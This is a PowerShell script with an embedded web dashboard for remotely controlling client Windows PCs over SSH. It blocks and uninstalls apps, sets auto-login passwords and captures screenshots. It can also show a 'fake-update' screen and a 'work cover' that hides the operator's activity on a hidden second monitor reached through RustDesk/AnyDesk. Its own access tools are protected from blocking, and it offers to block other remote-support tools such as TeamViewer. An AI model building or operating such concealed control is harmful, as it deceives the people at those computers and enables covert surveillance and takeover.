  let warn=failed?'<div style="font-size:11.5px;color:#e0b86f;background:#2a2016;border:1px solid #7a5a2e;border-radius:6px;padding:8px 10px;margin-bottom:10px">This client was slow to answer, so the list below may be incomplete. Hit Rescan to try a full scan again.</div>':'';
  o.innerHTML='<div style="display:flex;align-items:center;gap:10px;margin-bottom:6px"><div style="font-size:15px;color:#fff;font-weight:600">Block apps on '+esc(cname)+'</div>'+
    '<button onclick="appMgr(true)" style="margin-left:auto;background:none;border:1px solid #2c3752;color:#9fb0d0;border-radius:6px;padding:5px 10px;cursor:pointer">Rescan</button>'+
    '<button onclick="fleetBlocked()" style="background:none;border:1px solid #395182;color:#9dc3ff;border-radius:6px;padding:5px 10px;cursor:pointer">All clients</button>'+
    '<button onclick="document.getElementById(\'appWrap\').remove()" style="background:none;border:1px solid #2c3752;color:#9fb0d0;border-radius:6px;padding:5px 10px;cursor:pointer">Close</button></div>'+
    '<div style="font-size:11px;color:#7d8aa5;margin-bottom:10px">Blocked apps won\'t open, survive reinstall, and can\'t be bypassed by a normal user. Protected apps (your access tools) can\'t be blocked. Uninstall runs the app\'s real uninstaller on that PC.</div>'+
    warn+
    '<div style="background:#141b2b;border:1px solid #263148;border-radius:8px;padding:10px;margin-bottom:12px"><div style="font-size:12px;color:#8fa0c0;margin-bottom:6px">Message shown when a blocked app is opened (leave empty = silent, nothing happens):</div>'+
    '<div style="display:flex;gap:6px"><input id="blockMsg" placeholder="e.g. This app is blocked. Do not use - contact IT." value="'+((appCache[ip]&&appCache[ip].msg)||'').replace(/"/g,"&quot;")+'" style="flex:1;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:12.5px"><button onclick="saveBlockMsg()" style="padding:8px 14px;border-radius:6px;border:1px solid #295596;background:#1c3a6b;color:#fff;cursor:pointer;font-size:12.5px">Save message</button></div></div>'+
    '<input id="appSearch" placeholder="Filter apps..." oninput="appFilter()" style="width:100%;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:13px;margin-bottom:10px">'+
    '<div style="display:flex;gap:6px;margin-bottom:12px"><input id="appManual" placeholder="or type an .exe to block (e.g. teamviewer.exe)" style="flex:1;padding:8px 10px;border-radius:6px;border:1px solid #2c3752;background:#0f1420;color:#e6eaf2;font-size:12.5px"><button onclick="appBlockManual()" style="padding:8px 12px;border-radius:6px;border:1px solid #7a3a42;background:#3a2226;color:#e0868f;cursor:pointer;font-size:12.5px">Block</button></div>'+
    '<div id="appList">'+head+(rows||'')+(apps.length?'':'<div style="color:#7d8aa5;font-size:12px;padding:10px">No apps found. Use the box above to block by name.</div>')+'</div>';
  document.body.appendChild(o);
}
async function appToggle(btn,exe,block){
  const ip=document.getElementById('appWrap').dataset.ip;
  const um=((document.getElementById('blockMsg')||{}).value||'').trim().length>0;
  const prevText=btn.textContent;
  btn.disabled=true;btn.textContent=block?'Blocking...':'Unblocking...';
  let msg='';try{const r=await fetch(block?'/api/appblock':'/api/appunblock',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,exe,usemsg:um})});msg=(await r.json()).output||'';}catch(e){}
  const ok=block?(msg.indexOf('Blocked ')===0):(msg.indexOf('Unblocked ')===0);
  if(!ok){alert(msg||((block?'Block':'Unblock')+' failed - no response from client. Try again.'));btn.disabled=false;btn.textContent=prevText;return;}
  if(appCache[ip]){const s=new Set(appCache[ip].blocked);if(block)s.add(exe);else s.delete(exe);appCache[ip].blocked=[...s];
    showAppModal(appCache[ip].apps,s,new Set(appCache[ip].prot),clients.find(c=>c.ip===ip)?.name||'',ip);}
}
async function appUninstall(btn,exe){
  if(!confirm('Uninstall '+exe+' on this PC?\n\nThis launches the app\'s real uninstaller on the client - it may show a confirmation window there.'))return;
  const ip=document.getElementById('appWrap').dataset.ip;
  btn.disabled=true;btn.textContent='Uninstalling...';
  let msg='';try{const r=await fetch('/api/appuninstall',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,exe})});msg=(await r.json()).output||'';}catch(e){}
  alert(msg||'No response from client.');
  btn.disabled=false;btn.textContent='Uninstall';
}
async function saveBlockMsg(){
  const ip=document.getElementById('appWrap').dataset.ip;const v=(document.getElementById('blockMsg').value||'').trim();
  const btn=event.target;btn.textContent='Saving...';btn.disabled=true;
  let out='';try{const r=await fetch('/api/blockmsg',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,msg:v})});out=(await r.json()).output||'';}catch(e){}
  if(appCache[ip])appCache[ip].msg=v;
  btn.textContent='Saved';setTimeout(()=>{btn.textContent='Save message';btn.disabled=false;},1500);
}
function appFilter(){const q=(document.getElementById('appSearch').value||'').toLowerCase();document.querySelectorAll('#appList .appRow').forEach(r=>{r.style.display=(r.dataset.exe+r.dataset.name).includes(q)?'flex':'none';});}
async function appBlockManual(){const ip=document.getElementById('appWrap').dataset.ip;let v=(document.getElementById('appManual').value||'').trim().toLowerCase();if(!v)return;if(!v.endsWith('.exe'))v+='.exe';
  const um=((document.getElementById('blockMsg')||{}).value||'').trim().length>0;
  let msg='';try{const r=await fetch('/api/appblock',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,exe:v,usemsg:um})});msg=(await r.json()).output||'';}catch(e){}
  if(msg.indexOf('Blocked ')!==0){alert(msg||'Block failed - no response from client.');return;}
  document.getElementById('appManual').value='';
  if(appCache[ip]){const s=new Set(appCache[ip].blocked);s.add(v);appCache[ip].blocked=[...s];
    if(!appCache[ip].apps.some(a=>(a.exe||'').toLowerCase()===v))appCache[ip].apps.push({name:v,exe:v});
    showAppModal(appCache[ip].apps,s,new Set(appCache[ip].prot),clients.find(c=>c.ip===ip)?.name||'',ip);}
}
async function fleetBlocked(){
  let o=document.getElementById('appWrap');if(o)o.innerHTML='<div style="color:#9fb0d0;font-size:13px;padding:10px">Checking all clients...</div>';
  let data=[];try{const r=await fetch('/api/blockedall');data=JSON.parse((await r.json()).data||'[]');}catch(e){}
  if(!Array.isArray(data))data=data?[data]:[];
  let html='<div style="display:flex;align-items:center;gap:10px;margin-bottom:12px"><div style="font-size:15px;color:#fff;font-weight:600">Blocked apps - all clients</div><button onclick="document.getElementById(\'appWrap\').remove()" style="margin-left:auto;background:none;border:1px solid #2c3752;color:#9fb0d0;border-radius:6px;padding:5px 10px;cursor:pointer">Close</button></div>';
  if(!data.length)html+='<div style="color:#7d8aa5;font-size:12px;padding:10px">No apps are blocked on any online client.</div>';
  data.forEach(d=>{const bl=Array.isArray(d.blocked)?d.blocked:[d.blocked];
    html+='<div style="font-size:13px;color:#eef2f8;font-weight:600;margin:10px 0 4px">'+esc(d.name)+'</div>';
    bl.forEach(ex=>{html+='<div style="display:flex;align-items:center;gap:8px;padding:6px;border-bottom:1px solid #1d2537"><span style="flex:1;font-size:12.5px;color:#c9d4e6">'+esc(ex)+'</span><button onclick="fleetUnblock(this,\''+d.ip+'\',\''+ex+'\')" style="padding:5px 10px;border-radius:6px;border:1px solid #2e7d46;background:#173d26;color:#8fe0a8;cursor:pointer;font-size:12px">Unblock</button></div>';});
  });
  if(o)o.innerHTML=html;
}
async function fleetUnblock(btn,ip,exe){btn.disabled=true;btn.textContent='...';try{await fetch('/api/appunblock',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip,exe})});}catch(e){}if(appCache[ip]){appCache[ip].blocked=appCache[ip].blocked.filter(x=>x!==exe);}btn.closest('div').style.opacity=.4;btn.textContent='Unblocked';}
let curMode='off';
function paintMode(active){
  curMode=active;
  const b=document.getElementById('tgBlue'),k=document.getElementById('tgBlack'),bad=document.getElementById('modeBadge');
  if(!b||!k||!bad)return;
  b.textContent=(active==='blue')?'ON':'OFF';
  k.textContent=(active==='black')?'ON':'OFF';
  b.style.outline=(active==='blue')?'2px solid #7fbfff':'none';
  k.style.outline=(active==='black')?'2px solid #999':'none';
  if(active==='blue'){bad.textContent='Blue active';bad.style.background='#123a5a';bad.style.color='#8fd0ff';}
  else if(active==='black'){bad.textContent='Black active';bad.style.background='#2a2a2a';bad.style.color='#e6e6e6';}
  else{bad.textContent='Off';bad.style.background='#2b3550';bad.style.color='#9fb0d0';}
}
async function toggleMode(mode){
  if(!sel)return;
  const target=(curMode===mode)?'off':mode;
  showProg(0,1, target==='off' ? ('Turning off update screen on '+sel.name+'...') : ('Showing '+target+' update screen on '+sel.name+'...'));
  paintMode(target);
  try{const r=await fetch('/api/lockmode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,mode:target})});
  const j=await r.json();paintMode(j.active||target);
  updProg(1,1, target==='off' ? 'Update screen turned off.' : (target+' update screen is now showing.'));
  setTimeout(hideProg,2200);setTimeout(checkLock,1500);}catch(e){hideProg();paintMode(curMode);}
}
let wcMode='off';
function paintWork(active){
  wcMode=active;
  const up=document.getElementById('wcUpdate'),bad=document.getElementById('wcBadge');
  if(!up||!bad)return;
  up.style.outline=(active==='update')?'2px solid #7fbfff':'none';
  if(active==='update'||active==='black'){bad.textContent='Update cover ON';bad.style.background='#123a5a';bad.style.color='#8fd0ff';}
  else{bad.textContent='Off';bad.style.background='#2b3550';bad.style.color='#9fb0d0';}
}
async function workCover(mode){
  if(!sel)return;
  const msg = mode==='off' ? ('Turning off cover + removing 2nd screen on '+sel.name+'...')
                           : ('Applying '+mode+' cover on '+sel.name+'... (first time also sets up the 2nd screen)');
  showProg(0,1,msg); paintWork(mode==='off'?'off':mode);
  try{const r=await fetch('/api/workcover',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,mode})});
  const j=await r.json();paintWork(j.active||'off');
  updProg(1,1, mode==='off' ? 'Cover off, 2nd screen removed.' : (mode+' cover on. Connect with RustDesk/AnyDesk and switch to monitor 2.'));
  setTimeout(hideProg,3000);}catch(e){hideProg();}
}
async function checkWork(){
  if(!sel||!document.getElementById('wcBadge'))return;
  try{const r=await fetch('/api/workcoverget?ip='+sel.ip);paintWork((await r.json()).active||'off');}catch(e){}
}
let deadHits=0;
async function ping(){
  try{await fetch('/api/heartbeat',{cache:'no-store'});deadHits=0;}
  catch(e){deadHits++;if(deadHits>=2)showDead();}
}
function showDead(){
  if(document.getElementById('deadWrap'))return;
  const o=document.createElement('div');o.id='deadWrap';
  o.style.cssText='position:fixed;inset:0;background:#0b0f18;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:99999;text-align:center;padding:20px';
  o.innerHTML='<div style="font-size:20px;color:#fff;font-weight:600;margin-bottom:10px">Reconnecting...</div><div style="font-size:14px;color:#8fa0c0">Dashboard is restarting - this page will come back on its own.</div><div style="font-size:12px;color:#5a6577;margin-top:14px">If nothing happens after a minute, double-click DASHBOARD.bat.</div>';
  document.body.appendChild(o);
  const retry=setInterval(async()=>{
    try{await fetch('/api/heartbeat',{cache:'no-store'});clearInterval(retry);location.reload();}catch(e){}
  },2000);
}
function esc(s){return (s||'').replace(/[&<>]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[m]));}
function timeAgo(iso){
  if(!iso)return'unknown';
  const d=new Date(iso);if(isNaN(d))return'unknown';
  const s=Math.floor((Date.now()-d.getTime())/1000);
  if(s<60)return'just now';
  if(s<3600)return Math.floor(s/60)+'m ago';
  if(s<86400)return Math.floor(s/3600)+'h ago';
  return Math.floor(s/86400)+'d ago';
}
load();setInterval(load,8000);setInterval(ping,3000);setInterval(function(){if(sel&&document.getElementById('wcBadge')){checkWork();}},5000);setInterval(updateThumbs,5000);setTimeout(updateThumbs,1500);setInterval(tickLastUpd,1000);
</script></body></html>
'@

# ---------- server ----------
$listener = New-Object System.Net.HttpListener
$prefix = "http://127.0.0.1:$port/"
$listener.Prefixes.Add($prefix)
# The port may still be held for a moment by the previous instance shutting down (or by a
# leftover process DASHBOARD.bat hasn't cleared yet) - retry a few times before giving up,
# instead of exiting on the very first failed bind. This is what used to make the dashboard
# get stuck in a start/crash loop instead of just coming up a couple seconds later.
$started = $false
for ($i = 0; $i -lt 5 -and -not $started; $i++) {
    try { $listener.Start(); $started = $true }
    catch {
        if ($i -eq 0) {
            try { Get-NetTCPConnection -LocalPort $port -State Listen -EA SilentlyContinue | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force -EA SilentlyContinue } } catch {}
        }
        Start-Sleep -Seconds 2
    }
}
if (-not $started) { Write-Host "Could not start on $prefix after several tries - another program may be holding port $port."; exit }
Write-Host "Dashboard running at $prefix   (close this window to stop)"
Start-Process $prefix
try { Push-Names } catch {}   # push friendly names to clients so Telegram alerts use them

# When this window is closed (X button / Ctrl+C / logoff), drop every fake-update
# screen so no client is left stuck on the update screen.
try {
    [Console]::TreatControlCAsInput = $false
    $null = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -Action { Unlock-All } -ErrorAction SilentlyContinue
} catch {}
$null = Register-EngineEvent -SourceIdentifier ([System.Management.Automation.PsEngineEvent]::Exiting) -Action { Unlock-All } -ErrorAction SilentlyContinue
# Also handle the console-close (X) via a Win32 control handler.
try {
Add-Type -Namespace Win32 -Name Con -MemberDefinition @'
public delegate bool Handler(int sig);
[System.Runtime.InteropServices.DllImport("kernel32.dll")]
public static extern bool SetConsoleCtrlHandler(Handler h, bool add);
'@ -ErrorAction SilentlyContinue
$script:ctrlHandler = [Win32.Con+Handler]{ param($sig) Unlock-All; return $false }
[Win32.Con]::SetConsoleCtrlHandler($script:ctrlHandler, $true) | Out-Null
} catch {}

function Send($ctx, $text, $type='text/html; charset=utf-8') {
    $buf = [Text.Encoding]::UTF8.GetBytes($text)
    $ctx.Response.ContentType = $type
    $ctx.Response.ContentLength64 = $buf.Length
    $ctx.Response.OutputStream.Write($buf, 0, $buf.Length)
    $ctx.Response.OutputStream.Close()
}
function Body($ctx) { (New-Object IO.StreamReader($ctx.Request.InputStream)).ReadToEnd() | ConvertFrom-Json }

while ($true) {
    try {
        $ctx = $listener.GetContext()
    } catch {
        if (-not $listener.IsListening) {
            try { $listener.Start() } catch { Start-Sleep -Seconds 2 }
        }
        continue
    }
    $path = $ctx.Request.Url.AbsolutePath
    try {
        if ($path -eq '/') { Send $ctx $html }
        elseif ($path -eq '/api/clients') { Send $ctx ((Get-Clients | ConvertTo-Json -Compress)) 'application/json' }
        elseif ($path -eq '/api/heartbeat') { Send $ctx (@{ locked = (Heartbeat) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/action') {
            $b = Body $ctx; Send $ctx (@{ output = (Do-Action $b.ip $b.action) } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/blockedall') { Send $ctx (@{ data = (Blocked-All) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/appscan') { $b = Body $ctx; $c = Get-AppScan $b.ip ([bool]$b.force); Send $ctx (@{ apps = $c.apps; blocked = $c.blocked; protected = ($protectedApps -join ','); blockmsg = $c.blockmsg; failed = [bool]$c.failed } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/appblock') { $b = Body $ctx; Send $ctx (@{ output = (Block-App $b.ip $b.exe $b.usemsg) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/blockmsg') { $b = Body $ctx; Send $ctx (@{ output = (Set-BlockMsg $b.ip $b.msg) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/appunblock') { $b = Body $ctx; Send $ctx (@{ output = (Unblock-App $b.ip $b.exe) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/appuninstall') { $b = Body $ctx; Send $ctx (@{ output = (Uninstall-App $b.ip $b.exe) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/autologin') { $b = Body $ctx; Send $ctx (@{ output = (Set-AutoLogin $b.ip $b.pass) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/autologinoff') { $b = Body $ctx; Send $ctx (@{ output = (Clear-AutoLogin $b.ip) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/setuplink') { Send $ctx (@{ link = $setupLink } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/upgradeall') { Send $ctx (@{ output = (Upgrade-All) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/lockstatus') { $ip = $ctx.Request.QueryString['ip']; Send $ctx (@{ status = (Lock-Status $ip) } | ConvertTo-Json -Compress) 'application/json' }
        elseif ($path -eq '/api/lockget') {
            $ip = $ctx.Request.QueryString['ip']; Send $ctx ((Get-Lock $ip) | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/lockset') {
            $b = Body $ctx; Send $ctx (@{ output = (Set-Lock $b.ip $b.text $b.color $b.image) } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/lockmode') {
            # body: {ip, mode:'blue'|'black'|'off'}  -> off = unlock; blue/black = set style + lock
            $b = Body $ctx
            if ($b.mode -eq 'off') {
                Do-Action $b.ip 'unlock' | Out-Null
                Send $ctx (@{ active = 'off' } | ConvertTo-Json -Compress) 'application/json'
            } else {
                # Instant: one fire-and-forget SSH does everything on the client - drop any
                # current cover, write the new style, re-show it - so the dashboard never waits.
                $m = ($b.mode -replace '[^a-zA-Z]','').ToLower(); if ($m -ne 'blue') { $m = 'black' }
                $ps = @"
`$f='C:\ProgramData\RemoteSupport\config.txt'
Remove-Item 'C:\ProgramData\RemoteSupport\LOCK.flag' -Force -EA 0
`$d=Split-Path `$f; if(-not(Test-Path `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null}
`$k=@(); if(Test-Path `$f){`$k=@(Get-Content `$f | Where-Object {`$_ -notmatch '^LOCK_MODE=' -and `$_.Trim() -ne ''})}
`$k+='LOCK_MODE=$m'
Set-Content -Path `$f -Value `$k -Encoding ascii
Start-Sleep -Milliseconds 400
Set-Content -Path 'C:\ProgramData\RemoteSupport\LOCK.flag' -Value '' -Encoding ascii
"@
                SSH-Fire $b.ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))
                $script:lockedClients[$b.ip] = $true
                Send $ctx (@{ active = $m } | ConvertTo-Json -Compress) 'application/json'
            }
        }
        elseif ($path -eq '/api/lockmodeget') {
            $ip = $ctx.Request.QueryString['ip']
            $st = (Lock-Status $ip)
            $active = if ($st -eq 'locked') { (Get-LockMode $ip) } else { 'off' }
            Send $ctx (@{ active = $active; status = $st } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/workcover') {
            # body: {ip, mode:'black'|'update'|'off'}
            $b = Body $ctx
            if ($b.mode -eq 'off') { $a = (Stop-WorkCover $b.ip) }
            else { $a = (Start-WorkCover $b.ip $b.mode) }
            Send $ctx (@{ active = $a } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/workcoverget') {
            # Serve from the dashboard's own tracked state - no SSH, instant, never blocks.
            $ip = $ctx.Request.QueryString['ip']
            $a = if ($script:workCover.ContainsKey($ip)) { $script:workCover[$ip] } else { 'off' }
            Send $ctx (@{ active = $a } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/thumb') {
            # NON-BLOCKING preview: fetch the JPEG in a background ssh process and serve the
            # last cached image instantly. This never stalls the single-threaded server, so
            # button clicks stay fast even while the preview is refreshing.
            $ip = $ctx.Request.QueryString['ip']
            $tmp = Join-Path $env:TEMP ('thumb_' + ($ip -replace '[^0-9A-Za-z]','_') + '.b64')
            $f = $script:thumbFetch[$ip]
            # a previous background fetch finished -> load it into cache
            if ($f -and $f.proc.HasExited) {
                try { if (Test-Path $f.file) { $c = (Get-Content $f.file -Raw -EA 0); if ($c -and $c.Trim()) { $script:thumbCache[$ip] = $c.Trim() }; Remove-Item $f.file -Force -EA 0 } } catch {}
                $script:thumbFetch.Remove($ip); $f = $null
            }
            # no fetch in flight -> start one (fire-and-forget, output redirected to a temp file)
            if (-not $f) {
                try {
                    $u = Login-For $ip
                    $tps = "`$d='C:\ProgramData\RemoteSupport'; New-Item `$d -ItemType Directory -Force | Out-Null; Set-Content (Join-Path `$d 'THUMB.flag') '1' -Encoding ascii; `$f=Join-Path `$d 'thumb.jpg'; if(Test-Path `$f){[Convert]::ToBase64String([IO.File]::ReadAllBytes(`$f))}"
                    $al = @('-o','StrictHostKeyChecking=no','-o','BatchMode=yes','-o','ConnectTimeout=4',"$u@$ip",('powershell -NoProfile -EncodedCommand ' + (Enc $tps)))
                    $p = Start-Process ssh -WindowStyle Hidden -PassThru -RedirectStandardOutput $tmp -ArgumentList $al -ErrorAction SilentlyContinue
                    if ($p) { $script:thumbFetch[$ip] = @{ proc = $p; file = $tmp } }
                } catch {}
            }
            $img = if ($script:thumbCache.ContainsKey($ip)) { $script:thumbCache[$ip] } else { '' }
            Send $ctx (@{ img = $img } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/rename') {
            $b = Body $ctx; Save-Name $b.host $b.name; try { Push-Names } catch {}; Send $ctx (@{ ok = $true } | ConvertTo-Json -Compress) 'application/json'
        }
        elseif ($path -eq '/api/syncnames') {
            try { Push-Names } catch {}; Send $ctx (@{ ok = $true } | ConvertTo-Json -Compress) 'application/json'
        }
        else { $ctx.Response.StatusCode = 404; Send $ctx 'not found' 'text/plain' }
    } catch {
        Send $ctx (@{ output = "Error: $($_.Exception.Message)" } | ConvertTo-Json -Compress) 'application/json'
    }
}
